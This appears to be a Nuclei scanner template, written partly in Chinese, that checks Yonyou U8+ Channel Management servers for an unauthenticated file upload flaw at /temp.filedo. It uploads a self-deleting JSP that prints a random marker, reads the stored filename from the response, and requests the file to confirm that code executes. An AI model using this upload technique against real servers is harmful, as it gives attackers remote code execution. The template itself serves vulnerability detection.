id: yonyou-u8-plus-temp-filedo-fileupload
info:
  name: 用友U8+渠道管理(高级版) filedo 文件上传漏洞
  author: leadlife
  severity: critical
  description: 用友U8+是用友网络科技股份有限公司推出的企业管理综合平台，广泛应用于财务、进销存、人力资源等企业核心业务系统中。在U8+渠道管理（高级版）模块中，存在一处文件上传漏洞，位于其 filedo 接口。攻击者可通过构造特定的HTTP请求，将恶意脚本或可执行文件上传至服务器。该漏洞可能导致攻击者在目标服务器上执行任意代码，从而获取服务器控制权限，进一步窃取敏感数据、篡改业务数据或对内网其他系统发起攻击。
  reference: 
    - https://mrxn.net/jswz/yonyou-filedo-upload-rce.html
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: demo
    hunter-query: demo
    tips:
    repair:
    version:
  tags: fileupload,yonyou,u8plus

variables:
    filename: "{{to_lower(rand_base(4))}}"
    date: '{{date_time("%Y%M%D%H%M%S")}}'

http:
  - raw:
      - |
        POST /temp.filedo HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

        ------WebKitFormBoundary
        Content-Disposition: form-data; name="file"; filename="{{filename}}.jsp"

        <%out.print("{{randstr}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
        ------WebKitFormBoundary--
      
      - |+
        GET /userfile/default/attach/{{shellpath}} HTTP/1.1
        Host: {{Hostname}}

    extractors: 
      - type: json
        part: body_1
        internal: true
        name: shellpath
        json:
          - ".fileInfo[].newname"

    matchers:
      - type: dsl
        dsl:
          - status_code_1 == 200 && status_code_2 == 200
          - contains(body_2,'{{randstr}}')
        condition: and